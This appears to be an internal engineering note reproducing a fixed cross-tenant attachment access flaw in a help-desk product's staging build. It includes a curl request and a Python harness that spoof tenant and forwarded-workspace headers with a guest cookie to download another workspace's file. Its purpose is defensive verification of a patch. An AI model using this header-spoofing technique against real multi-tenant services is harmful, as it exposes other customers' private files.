# Engineering reproduction notes

Environment:
- NimbusDesk 4.8.2 staging build.
- Guest upload intake enabled.
- External attachment connector pointed at the staging object store.
- Proxy profile: partner-edge-forward-all.
- Seed workspaces: alpha-grove and beta-ridge.

Lab sequence:
1. Create a ticket in alpha-grove with a PDF attachment.
2. Copy the preview-link attachment identifier from the alpha-grove
   browser session.
3. Open a beta-ridge guest session in a different browser profile.
4. Submit the beta-ridge request below while providing the alpha-grove
   attachment identifier.

Request used in staging:
```bash
curl -i "https://staging.nimbusdesk.example/api/v1/attachments/raw?attachment_id=att_7f3a9c21&download=1" \
  -H "X-Nimbus-Tenant: alpha-grove" \
  -H "X-Forwarded-Workspace: beta-ridge" \
  -H "Cookie: nd_guest=stg_ndk_51af7a9e"
```

The same behavior was reproduced with the short Python harness below.
It iterates over two seeded workspace slugs and reports the first
response that returns file bytes.

```python
import requests

url = "https://staging.nimbusdesk.example/api/v1/attachments/raw"
for workspace in ["alpha-grove", "beta-ridge"]:
    r = requests.get(
        url,
        params={"attachment_id": "att_7f3a9c21", "download": "1"},
        headers={
            "X-Nimbus-Tenant": "alpha-grove",
            "X-Forwarded-Workspace": workspace,
            "Cookie": "nd_guest=stg_ndk_51af7a9e",
        },
        timeout=8,
    )
    print(workspace, r.status_code, r.headers.get("content-type"))
```

Staging result:
The beta-ridge request returned the alpha-grove attachment bytes before
the patch. The patched build returns a denied access response and records
`attachment.access.denied`.
